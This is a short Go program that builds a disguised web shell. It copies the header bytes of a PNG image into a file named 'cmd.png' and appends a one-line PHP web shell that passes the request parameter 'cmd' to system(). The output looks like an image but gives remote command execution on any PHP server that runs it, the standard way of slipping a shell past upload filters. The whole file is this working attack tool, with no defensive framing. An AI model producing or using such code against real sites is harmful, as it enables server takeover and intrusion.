package main

import (
	"os"
)

func main() {
	const content = "<?php echo system($_REQUEST['cmd']); ?>"

	fimg, err := os.Open("logo.png")
	check(err)
	header := make([]byte, 512)
	n, err := fimg.Read(header)
	check(err)

	f, err := os.Create("cmd.png")
	check(err)

	// fmt.Print(hex.Dump(header))
	_, err = f.Write(header[:n])
	check(err)
	_, err = f.Write([]byte(content))
	check(err)
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}
